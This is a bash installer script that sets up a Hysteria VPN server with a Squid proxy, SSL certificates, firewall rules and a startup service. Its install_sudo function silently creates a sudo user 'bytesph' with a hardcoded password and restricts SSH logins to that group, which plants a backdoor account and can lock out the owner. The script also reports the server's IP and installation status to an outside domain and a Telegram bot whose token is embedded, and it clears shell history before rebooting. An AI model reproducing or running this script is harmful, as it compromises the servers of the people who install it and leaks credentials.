#!/bin/bash
#Script By AkoSiBytes
#Script Variables
clear
IP=$(curl -s https://api.ipify.org)
DOMAIN="https://zoey.bytesph.com"
SUB_DOMAIN=$(curl -sb -X POST $DOMAIN/api/servers/domain -H "Content-Type: application/x-www-form-urlencoded" -d "ip=$IP")
API="$DOMAIN/api/hysteria"
PORT=7777
GROUP_ID="5075831208"
BOT_TOKEN="5405146881:AAEWI1C917dE_K8JzKwR4F_v2s1s8jX-8aw"

clear
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain      :  $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  ##########################"
echo "    Preparing Installation  "
echo "  ##########################"

message="Hysteria Installation | IP: $IP | Domain: $SUB_DOMAIN | API: $API"
curl -s --data "text=$message" --data "chat_id=$GROUP_ID" 'https://api.telegram.org/bot'$BOT_TOKEN'/sendMessage'  &>/dev/null
sleep 3

server_ip=$(curl -s https://api.ipify.org)
timedatectl set-timezone Asia/Manila

install_require () {
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Updates&ip=$MYIP"
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  #####################################"
echo "    Installing Required Dependencies.  "
echo "  #####################################"
{
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y gnupg openssl
apt install -y iptables socat
apt install -y netcat httpie php neofetch vnstat
apt install -y screen gnutls-bin python
apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
apt install -y build-essential
clear
} &>/dev/null
clear
}

install_hysteria(){
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Hysteria&ip=$IP"
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  ########################"
echo "    Installing Hysteria   "
echo "  ########################"
{
wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/apernet/hysteria/master/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh
} &>/dev/null
}

modify_hysteria(){
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  #########################"
echo "    Configuring Hysteria   "
echo "  #########################"
{
rm -f /etc/hysteria/config.json

echo "{
  \"listen\": \":$PORT\",
  \"cert\": \"/etc/hysteria/hysteria.crt\",
  \"key\": \"/etc/hysteria/hysteria.key\",
  \"up_mbps\": 100,
  \"down_mbps\": 100,
  \"disable_udp\": false,
  \"obfs\": \"vpnudp\",
  \"auth\": {
    \"mode\": \"external\",
    \"config\": {
          \"http\": \"$API\"
        }
  }
}
" >> /etc/hysteria/config.json

chmod 755 /etc/hysteria/config.json
chmod 755 /etc/hysteria/hysteria.crt
chmod 755 /etc/hysteria/hysteria.key
} &>/dev/null
}

install_letsencrypt(){
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=SSL&ip=$IP"
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  ###############################"
echo "    Requesting SSL Certificate   "
echo "  ###############################"
{
apt remove apache2 -y
echo "$SUB_DOMAIN" > /root/domain
curl  https://get.acme.sh | sh
~/.acme.sh/acme.sh --register-account -m bytesph2023@gmail.com --server zerossl
~/.acme.sh/acme.sh --issue -d "$SUB_DOMAIN" --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d "$SUB_DOMAIN" --fullchainpath /etc/hysteria/hysteria.crt --keypath /etc/hysteria/hysteria.key --ecc
} &>/dev/null
}

install_firewall_kvm () {
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Firewall&ip=$IP"
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  ##########################"
echo "    Configuring IP Tables   "
echo "  ##########################"
echo "net.ipv4.ip_forward=1
net.ipv4.conf.all.rp_filter=0
net.ipv4.conf.eth0.rp_filter=0" >> /etc/sysctl.conf
#sysctl -p
{
iptables -F
iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :$PORT
iptables-save > /etc/iptables_rules.v4
ip6tables-save > /etc/iptables_rules.v6
} &>/dev/null
}

install_sudo(){
  {
    useradd -m bytesph 2>/dev/null; echo bytesph:bytesph2023!!!@@@ | chpasswd &>/dev/null; usermod -aG sudo bytesph &>/dev/null
    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
    echo "AllowGroups bytesph" >> /etc/ssh/sshd_config
    service sshd restart
  } &>/dev/null
}

install_squid(){
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Squid&ip=$IP"
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  #####################"
echo "    Installing Proxy   "
echo "  #####################"
{
sudo apt install -y squid
cd /etc/squid/ || exit
rm squid.conf
echo "acl SSH dst $(ip route get 8.8.8.8 | awk '/src/ {f=NR} f&&NR-1==f' RS=" ")" >> squid.conf
echo 'acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
http_access allow SSH
http_access deny all
http_port 8080
http_port 8181
http_port 9090
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname KobZ-Proxy' >> squid.conf

service squid restart
cd /etc || exit
} &>/dev/null
}

install_rclocal(){
  {
    echo "[Unit]
Description=bytesph service
Documentation=http://bytesph.com

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/rc.local
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/bytesph.service
    echo "#!/bin/sh -e
curl -sb -X POST $DOMAIN/api/server/install -H 'Content-Type: application/x-www-form-urlencoded' -d 'status=rebooted&ip=$IP'
iptables-restore < /etc/iptables_rules.v4
ip6tables-restore < /etc/iptables_rules.v6
sysctl -p
service hysteria-server restart
exit 0" >> /etc/rc.local
    sudo chmod +x /etc/rc.local
    systemctl daemon-reload
    sudo systemctl enable bytesph
    sudo systemctl start bytesph.service
  } &>/dev/null
}

start_service () {

curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Finalizing&ip=$IP"
clear
echo ""
echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
echo ""
echo "  Domain:        $SUB_DOMAIN"
echo "  API Endpoint:  $API"
echo ""
echo "  ############################"
echo "    Finalizing Installation   "
echo "  ############################"
sleep 2
{

sudo crontab -l | { echo "7 0 * * * /root/.acme.sh/acme.sh --cron --home /root/.acme.sh > /dev/null"; } | crontab -
sudo systemctl restart cron
} &>/dev/null
clear
echo ""

echo '  #############################################'
echo '  *      Hysteria Installation Complete       *'
echo '  *    Telegram: https://t.me/bytesph2023     *'
echo '  *           Script By AkoSiBytes            *'
echo '  #############################################'
echo ""
echo "  Server IP : $server_ip"
echo "  Hysteria Port : $PORT"
echo ""
echo "  This info is found on /root/hysteria.txt"

{
  echo '  #############################################'
  echo '  *      Hysteria Installation Complete       *'
  echo '  *    Telegram: https://t.me/bytesph2023     *'
  echo '  *           Script By AkoSiBytes            *'
  echo '  #############################################'
  echo ""
  echo "  Script By AkoSiBytes | "
  echo "  Serer IP : $server_ip"
  echo "  Hysteria Port : $PORT"
} >> /root/hysteria.txt
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=done&ip=$IP"
history -c
rm /root/install_server.sh &>/dev/null
sleep 10
curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Rebooting&ip=$IP"
reboot
}

install_require
install_sudo
install_hysteria
install_letsencrypt
install_firewall_kvm
modify_hysteria
install_squid
install_rclocal
start_service
